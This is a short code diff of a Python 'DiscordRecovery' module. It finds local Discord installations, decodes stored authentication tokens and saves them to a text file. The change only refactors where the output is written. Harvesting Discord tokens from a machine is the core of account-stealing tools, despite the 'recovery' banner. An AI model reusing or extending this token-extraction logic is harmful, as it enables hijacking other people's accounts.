@@ -21,7 +21,7 @@ class DATA_BLOB(Structure):
 
 class DiscordRecovery(ModuleManager):
     def __init__(self) -> None:
-        super().__init__(module_name="DiscordRecovery")
+        super().__init__(module_name="DiscordRecovery", module_path="applications/discord")
 
         self.banner(r"""
      _______         ______  _                          _ 
@@ -33,10 +33,6 @@ class DiscordRecovery(ModuleManager):
   |:::::::::::|\    
   `-=========-`()       Recover Lost Discord Accounts
                 """)
-
-        self.discord_folder = self.output_folder_user / 'applications' / 'discord'
-
-        self.discord_folder.mkdir(parents=True, exist_ok=True)
 
         self.discordInstallations = [
                 [f"{Constant.roaming_dir}/Discord","Discord"],
@@ -103,7 +99,7 @@ class DiscordRecovery(ModuleManager):
                             tokens.append(tokenDecoded)
                             self.tokensCount += 1
 
-        with open(os.path.join(self.discord_folder, f"{savefname}.txt"), 'w', encoding='utf-8') as file:
+        with open(os.path.join(self.module_output, f"{savefname}.txt"), 'w', encoding='utf-8') as file:
             file.write('\n'.join(tokens))
             self.mprint(f"[{savefname}] Saved {len(tokens)} tokens to {savefname}.txt")
 
